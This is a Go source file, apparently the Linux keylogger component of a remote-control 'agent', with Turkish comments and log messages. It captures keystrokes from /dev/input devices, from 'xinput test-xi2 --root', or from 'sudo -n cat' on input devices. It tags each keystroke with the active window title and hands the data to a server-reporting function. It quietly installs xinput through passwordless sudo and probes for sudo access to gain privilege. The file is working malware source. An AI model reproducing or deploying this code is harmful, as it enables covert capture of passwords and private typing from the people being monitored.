//go:build linux

package main

import (
	"bufio"
	"encoding/binary"
	"fmt"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"time"
)

// Linux input_event struct (24 bytes on 64-bit)
type inputEvent struct {
	TimeSec  uint64
	TimeUsec uint64
	Type     uint16
	Code     uint16
	Value    int32
}

const (
	evKey    = 1
	keyPress = 1
)

// Special keys (non-character) — evdev keycodes
var linuxSpecialKeys = map[uint16]string{
	1: "[ESC]", 14: "[BACKSPACE]", 15: "[TAB]", 28: "[ENTER]",
	57: " ", 58: "[CAPSLOCK]",
	59: "[F1]", 60: "[F2]", 61: "[F3]", 62: "[F4]", 63: "[F5]", 64: "[F6]",
	65: "[F7]", 66: "[F8]", 67: "[F9]", 68: "[F10]", 87: "[F11]", 88: "[F12]",
	102: "[HOME]", 103: "[UP]", 104: "[PGUP]",
	105: "[LEFT]", 106: "[RIGHT]",
	107: "[END]", 108: "[DOWN]", 109: "[PGDN]",
	110: "[INS]", 111: "[DEL]",
}

// Fallback US layout — used only when xmodmap is unavailable
var linuxFallbackKeys = map[uint16]string{
	2: "1", 3: "2", 4: "3", 5: "4", 6: "5", 7: "6", 8: "7", 9: "8", 10: "9", 11: "0",
	12: "-", 13: "=",
	16: "q", 17: "w", 18: "e", 19: "r", 20: "t", 21: "y", 22: "u", 23: "i", 24: "o", 25: "p",
	26: "[", 27: "]",
	30: "a", 31: "s", 32: "d", 33: "f", 34: "g", 35: "h", 36: "j", 37: "k", 38: "l",
	39: ";", 40: "'", 41: "`", 43: "\\",
	44: "z", 45: "x", 46: "c", 47: "v", 48: "b", 49: "n", 50: "m",
	51: ",", 52: ".", 53: "/",
}

// Skip modifier-only keys
var linuxSkipKeys = map[uint16]bool{
	29: true, 42: true, 54: true, 56: true, 97: true, 100: true, // ctrl, shift, alt
	125: true, 126: true, // super
}

// xinput special keys (X11 keycodes = evdev + 8)
var xinputSpecialKeys = map[int]string{
	9: "[ESC]", 22: "[BACKSPACE]", 23: "[TAB]", 36: "[ENTER]",
	65: " ", 66: "[CAPSLOCK]",
	67: "[F1]", 68: "[F2]", 69: "[F3]", 70: "[F4]", 71: "[F5]", 72: "[F6]",
	73: "[F7]", 74: "[F8]", 75: "[F9]", 76: "[F10]", 95: "[F11]", 96: "[F12]",
	110: "[HOME]", 111: "[UP]", 112: "[PGUP]",
	113: "[LEFT]", 114: "[RIGHT]",
	115: "[END]", 116: "[DOWN]", 117: "[PGDN]",
	118: "[INS]", 119: "[DEL]",
}

// xinput modifier keycodes to skip
var xinputSkipKeys = map[int]bool{
	37: true, 105: true, // ctrl
	50: true, 62: true, // shift
	64: true, 108: true, // alt
	133: true, 134: true, // super
}

// xmodmap-based keycode → character map (populated at runtime from `xmodmap -pke`)
var xmodmapKeys map[int]string // X11 keycode → character
var xmodmapLoaded bool

// loadXmodmap parses `xmodmap -pke` to build a locale-aware keymap
// This handles Turkish Q, Turkish F, and any other XKB layout
func loadXmodmap() {
	xmodmapKeys = make(map[int]string)
	xmodmapLoaded = true

	out, err := exec.Command("xmodmap", "-pke").Output()
	if err != nil {
		log.Printf("[KEYLOG-LINUX] xmodmap çalıştırılamadı: %v (fallback US layout kullanılacak)", err)
		return
	}

	// Format: keycode  24 = q Q q Q at Greek_OMEGA
	// We want the first keysym (unshifted)
	for _, line := range strings.Split(string(out), "\n") {
		line = strings.TrimSpace(line)
		if !strings.HasPrefix(line, "keycode") {
			continue
		}
		parts := strings.SplitN(line, "=", 2)
		if len(parts) != 2 {
			continue
		}
		// Parse keycode number
		kcStr := strings.TrimSpace(strings.TrimPrefix(parts[0], "keycode"))
		kc, err := strconv.Atoi(kcStr)
		if err != nil {
			continue
		}
		// Parse keysyms
		syms := strings.Fields(strings.TrimSpace(parts[1]))
		if len(syms) == 0 {
			continue
		}
		sym := syms[0]
		ch := keysymToChar(sym)
		if ch != "" {
			xmodmapKeys[kc] = ch
		}
	}

	log.Printf("[KEYLOG-LINUX] xmodmap yüklendi: %d tuş eşlemesi (klavye düzeni algılandı)", len(xmodmapKeys))
}

// keysymToChar converts an X11 keysym name to a character
func keysymToChar(sym string) string {
	// Single character keysyms (a-z, 0-9, punctuation)
	if len(sym) == 1 {
		return sym
	}

	// Common Turkish and special keysym names
	keysymMap := map[string]string{
		// Turkish characters
		"gbreve":           "ğ",
		"Gbreve":           "Ğ",
		"idotless":         "ı",
		"Iabovedot":        "İ",
		"scedilla":         "ş",
		"Scedilla":         "Ş",
		"ccedilla":         "ç",
		"Ccedilla":         "Ç",
		"odiaeresis":       "ö",
		"Odiaeresis":       "Ö",
		"udiaeresis":       "ü",
		"Udiaeresis":       "Ü",
		// German/common
		"adiaeresis":       "ä",
		"Adiaeresis":       "Ä",
		"ssharp":           "ß",
		// Punctuation & symbols
		"space":            " ",
		"exclam":           "!",
		"quotedbl":         "\"",
		"numbersign":       "#",
		"dollar":           "$",
		"percent":          "%",
		"ampersand":        "&",
		"apostrophe":       "'",
		"quoteright":       "'",
		"parenleft":        "(",
		"parenright":       ")",
		"asterisk":         "*",
		"plus":             "+",
		"comma":            ",",
		"minus":            "-",
		"period":           ".",
		"slash":            "/",
		"colon":            ":",
		"semicolon":        ";",
		"less":             "<",
		"equal":            "=",
		"greater":          ">",
		"question":         "?",
		"at":               "@",
		"bracketleft":      "[",
		"backslash":        "\\",
		"bracketright":     "]",
		"asciicircum":      "^",
		"underscore":       "_",
		"grave":            "`",
		"quoteleft":        "`",
		"braceleft":        "{",
		"bar":              "|",
		"braceright":       "}",
		"asciitilde":       "~",
	}

	if ch, ok := keysymMap[sym]; ok {
		return ch
	}

	// If it starts with uppercase and is a known letter name, skip (it's a modifier/special)
	// Return empty for unknown keysyms (control keys, etc.)
	return ""
}

// resolveKeyFromEvdev translates an evdev keycode to a character using xmodmap
// evdev keycode + 8 = X11 keycode
func resolveKeyFromEvdev(code uint16) string {
	if !xmodmapLoaded {
		loadXmodmap()
	}
	x11Code := int(code) + 8
	if ch, ok := xmodmapKeys[x11Code]; ok {
		return ch
	}
	// Fallback to US layout
	if ch, ok := linuxFallbackKeys[code]; ok {
		return ch
	}
	return fmt.Sprintf("[KEY_%d]", code)
}

// resolveKeyFromXinput translates an X11 keycode to a character using xmodmap
func resolveKeyFromXinput(x11Code int) string {
	if !xmodmapLoaded {
		loadXmodmap()
	}
	if ch, ok := xmodmapKeys[x11Code]; ok {
		return ch
	}
	// Fallback: convert to evdev and try fallback map
	evdev := uint16(x11Code - 8)
	if ch, ok := linuxFallbackKeys[evdev]; ok {
		return ch
	}
	return fmt.Sprintf("[KEY_%d]", x11Code)
}

func platformKeylogAvailable() bool {
	// Method 1: Can we read /dev/input/event* directly?
	devices := findKeyboardDevices()
	log.Printf("[KEYLOG-LINUX] Bulunan klavye cihazları: %v", devices)

	for _, dev := range devices {
		f, err := os.Open(dev)
		if err == nil {
			f.Close()
			log.Printf("[KEYLOG-LINUX] ✓ %s doğrudan okunabilir", dev)
			return true
		}
		log.Printf("[KEYLOG-LINUX] ✗ %s açılamadı: %v", dev, err)
	}

	// Method 2: Is xinput available? (works without root on X11)
	display := os.Getenv("DISPLAY")
	log.Printf("[KEYLOG-LINUX] DISPLAY=%q WAYLAND_DISPLAY=%q", display, os.Getenv("WAYLAND_DISPLAY"))

	if display != "" {
		xinputPath, err := exec.LookPath("xinput")
		if err == nil {
			log.Printf("[KEYLOG-LINUX] ✓ xinput bulundu: %s", xinputPath)
			return true
		}
		log.Printf("[KEYLOG-LINUX] ✗ xinput bulunamadı: %v", err)

		// Auto-install xinput
		log.Println("[KEYLOG-LINUX] xinput kuruluyor (apt-get)...")
		installOut, installErr := exec.Command("sudo", "-n", "apt-get", "install", "-y", "xinput").CombinedOutput()
		if installErr != nil {
			log.Printf("[KEYLOG-LINUX] ✗ apt-get install xinput başarısız: %v — %s", installErr, string(installOut))
			// dnf dene
			installOut2, installErr2 := exec.Command("sudo", "-n", "dnf", "install", "-y", "xinput").CombinedOutput()
			if installErr2 != nil {
				log.Printf("[KEYLOG-LINUX] ✗ dnf install xinput başarısız: %v — %s", installErr2, string(installOut2))
			}
		}

		// Tekrar kontrol
		if _, err := exec.LookPath("xinput"); err == nil {
			log.Println("[KEYLOG-LINUX] ✓ xinput kuruldu")
			return true
		}
	} else {
		log.Println("[KEYLOG-LINUX] ✗ DISPLAY ayarlı değil, xinput kullanılamaz")
	}

	// Method 3: Can we use sudo?
	if len(devices) > 0 {
		sudoErr := exec.Command("sudo", "-n", "cat", "/dev/null").Run()
		if sudoErr == nil {
			log.Println("[KEYLOG-LINUX] ✓ passwordless sudo mevcut")
			return true
		}
		log.Printf("[KEYLOG-LINUX] ✗ passwordless sudo yok: %v", sudoErr)
	}

	log.Println("[KEYLOG-LINUX] ✗ Hiçbir yöntem kullanılamadı!")
	log.Println("[KEYLOG-LINUX] Çözümler:")
	log.Println("[KEYLOG-LINUX]   1) Agent'ı root olarak çalıştırın: sudo ./agent")
	log.Println("[KEYLOG-LINUX]   2) Kullanıcıyı input grubuna ekleyin: sudo usermod -aG input $USER")
	log.Println("[KEYLOG-LINUX]   3) X11 ortamında xinput kurun: sudo apt install xinput")
	return false
}

func platformKeylogError() string {
	devices := findKeyboardDevices()
	parts := []string{}

	if len(devices) == 0 {
		parts = append(parts, "Klavye cihazı bulunamadı (/dev/input/event*)")
	} else {
		for _, dev := range devices {
			if _, err := os.Open(dev); err != nil {
				parts = append(parts, fmt.Sprintf("%s: %v", dev, err))
			}
		}
	}

	display := os.Getenv("DISPLAY")
	if display == "" {
		parts = append(parts, "DISPLAY değişkeni ayarlı değil (xinput kullanılamaz)")
	} else if _, err := exec.LookPath("xinput"); err != nil {
		parts = append(parts, fmt.Sprintf("xinput kurulu değil (DISPLAY=%s)", display))
	}

	if len(devices) > 0 {
		if err := exec.Command("sudo", "-n", "cat", "/dev/null").Run(); err != nil {
			parts = append(parts, "Passwordless sudo yok")
		}
	}

	msg := "Keylogger başlatılamadı. "
	if len(parts) > 0 {
		msg += "Nedenler: " + strings.Join(parts, " | ")
	}
	msg += " — Çözüm: 'sudo ./agent' veya 'sudo usermod -aG input $USER' veya 'sudo apt install xinput'"
	return msg
}

func findKeyboardDevices() []string {
	var devices []string

	// /proc/bus/input/devices dosyasından keyboard olanları bul
	data, err := os.ReadFile("/proc/bus/input/devices")
	if err != nil {
		matches, _ := filepath.Glob("/dev/input/event*")
		return matches
	}

	lines := strings.Split(string(data), "\n")
	var currentHandlers string
	isKeyboard := false

	for _, line := range lines {
		if strings.HasPrefix(line, "N: Name=") {
			name := strings.ToLower(line)
			isKeyboard = strings.Contains(name, "keyboard") || strings.Contains(name, "kbd")
		}
		if strings.HasPrefix(line, "H: Handlers=") {
			currentHandlers = line
		}
		if line == "" {
			if isKeyboard && currentHandlers != "" {
				for _, field := range strings.Fields(currentHandlers) {
					if strings.HasPrefix(field, "event") {
						devices = append(devices, "/dev/input/"+field)
					}
				}
			}
			isKeyboard = false
			currentHandlers = ""
		}
	}

	if len(devices) == 0 {
		matches, _ := filepath.Glob("/dev/input/event*")
		if len(matches) > 0 {
			devices = append(devices, matches[0])
		}
	}

	return devices
}

func getActiveWindowTitleLinux() string {
	if os.Getenv("DISPLAY") == "" && os.Getenv("WAYLAND_DISPLAY") == "" {
		return ""
	}
	out, err := exec.Command("xdotool", "getactivewindow", "getwindowname").Output()
	if err != nil {
		return ""
	}
	return strings.TrimSpace(string(out))
}

func platformKeylogCapture(stopCh chan struct{}) {
	devices := findKeyboardDevices()

	// Try Method 1: Direct /dev/input read (requires root or input group)
	for _, dev := range devices {
		if f, err := os.Open(dev); err == nil {
			f.Close()
			log.Printf("[KEYLOG-LINUX] Yöntem: /dev/input (doğrudan) — %v", devices)
			for _, d := range devices {
				go captureFromDevice(d, stopCh)
			}
			<-stopCh
			return
		}
	}

	// Try Method 2: xinput (X11, no root needed) — yoksa kur
	if os.Getenv("DISPLAY") != "" {
		if _, err := exec.LookPath("xinput"); err != nil {
			log.Println("[KEYLOG-LINUX] xinput bulunamadı, kuruluyor...")
			if installErr := exec.Command("sudo", "-n", "apt-get", "install", "-y", "xinput").Run(); installErr != nil {
				// apt olmayabilir, dnf dene
				exec.Command("sudo", "-n", "dnf", "install", "-y", "xinput").Run()
			}
		}
	}
	if _, err := exec.LookPath("xinput"); err == nil && os.Getenv("DISPLAY") != "" {
		log.Println("[KEYLOG-LINUX] Yöntem: xinput (X11, root gereksiz)")
		captureWithXinput(stopCh)
		return
	}

	// Try Method 3: sudo cat /dev/input (passwordless sudo)
	if len(devices) > 0 {
		if err := exec.Command("sudo", "-n", "cat", "/dev/null").Run(); err == nil {
			log.Printf("[KEYLOG-LINUX] Yöntem: sudo /dev/input — %v", devices)
			for _, d := range devices {
				go captureWithSudo(d, stopCh)
			}
			<-stopCh
			return
		}
	}

	log.Println("[KEYLOG-LINUX] Hiçbir yöntem kullanılamadı!")
	sendMessage(map[string]interface{}{
		"type":    "keylog_error",
		"agentId": agentID,
		"data": map[string]interface{}{
			"error": "Linux keylogger: Yetki yok. Agent'ı root olarak çalıştırın, kullanıcıyı 'input' grubuna ekleyin, veya X11 için 'xinput' kurun.",
		},
	})
}

// Method 1: Direct /dev/input/event* read
func captureFromDevice(devicePath string, stopCh chan struct{}) {
	f, err := os.Open(devicePath)
	if err != nil {
		log.Printf("[KEYLOG-LINUX] %s açılamadı: %v", devicePath, err)
		return
	}
	defer f.Close()

	log.Printf("[KEYLOG-LINUX] %s dinleniyor (doğrudan)", devicePath)
	readInputEvents(f, stopCh)
}

// Method 2: xinput test-xi2 --root (X11, no root needed)
func captureWithXinput(stopCh chan struct{}) {
	cmd := exec.Command("xinput", "test-xi2", "--root")
	cmd.Env = append(os.Environ())

	stdout, err := cmd.StdoutPipe()
	if err != nil {
		log.Printf("[KEYLOG-LINUX] xinput pipe hatası: %v", err)
		return
	}

	if err := cmd.Start(); err != nil {
		log.Printf("[KEYLOG-LINUX] xinput başlatılamadı: %v", err)
		return
	}

	go func() {
		<-stopCh
		cmd.Process.Kill()
	}()

	scanner := bufio.NewScanner(stdout)
	inKeyPress := false

	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())

		// xinput test-xi2 output:
		// EVENT type 2 (KeyPress)
		//     detail: 38
		//     ...
		if strings.Contains(line, "KeyPress") {
			inKeyPress = true
			continue
		}
		if strings.Contains(line, "KeyRelease") || strings.Contains(line, "EVENT type") {
			inKeyPress = false
			continue
		}

		if inKeyPress && strings.HasPrefix(line, "detail:") {
			parts := strings.Fields(line)
			if len(parts) >= 2 {
				detail, err := strconv.Atoi(parts[1])
				if err != nil {
					continue
				}

				// Skip modifiers
				if xinputSkipKeys[detail] {
					continue
				}

				// Check special keys first
				if special, ok := xinputSpecialKeys[detail]; ok {
					window := getActiveWindowTitleLinux()
					addKeyEvent(special, window)
					continue
				}

				// Use xmodmap for locale-aware resolution
				keyStr := resolveKeyFromXinput(detail)
				window := getActiveWindowTitleLinux()
				addKeyEvent(keyStr, window)
			}
		}
	}

	cmd.Wait()
}

// Method 3: sudo cat /dev/input/event* (passwordless sudo)
func captureWithSudo(devicePath string, stopCh chan struct{}) {
	cmd := exec.Command("sudo", "-n", "cat", devicePath)

	stdout, err := cmd.StdoutPipe()
	if err != nil {
		log.Printf("[KEYLOG-LINUX] sudo pipe hatası: %v", err)
		return
	}

	if err := cmd.Start(); err != nil {
		log.Printf("[KEYLOG-LINUX] sudo başlatılamadı: %v", err)
		return
	}

	log.Printf("[KEYLOG-LINUX] %s dinleniyor (sudo)", devicePath)

	go func() {
		<-stopCh
		cmd.Process.Kill()
	}()

	readInputEvents(stdout, stopCh)
	cmd.Wait()
}

// Shared: read input_event structs from a reader
func readInputEvents(r interface{ Read([]byte) (int, error) }, stopCh chan struct{}) {
	eventSize := 24
	buf := make([]byte, eventSize)

	for {
		select {
		case <-stopCh:
			return
		default:
		}

		n, err := r.Read(buf)
		if err != nil {
			// Check if stopped
			select {
			case <-stopCh:
				return
			default:
			}
			time.Sleep(10 * time.Millisecond)
			continue
		}
		if n < eventSize {
			continue
		}

		ev := inputEvent{
			TimeSec:  binary.LittleEndian.Uint64(buf[0:8]),
			TimeUsec: binary.LittleEndian.Uint64(buf[8:16]),
			Type:     binary.LittleEndian.Uint16(buf[16:18]),
			Code:     binary.LittleEndian.Uint16(buf[18:20]),
			Value:    int32(binary.LittleEndian.Uint32(buf[20:24])),
		}

		if ev.Type != evKey || ev.Value != keyPress {
			continue
		}

		if linuxSkipKeys[ev.Code] {
			continue
		}

		// Check special keys first
		if special, ok := linuxSpecialKeys[ev.Code]; ok {
			window := getActiveWindowTitleLinux()
			addKeyEvent(special, window)
			continue
		}

		// Use xmodmap for locale-aware character resolution
		keyStr := resolveKeyFromEvdev(ev.Code)
		window := getActiveWindowTitleLinux()
		addKeyEvent(keyStr, window)
	}
}
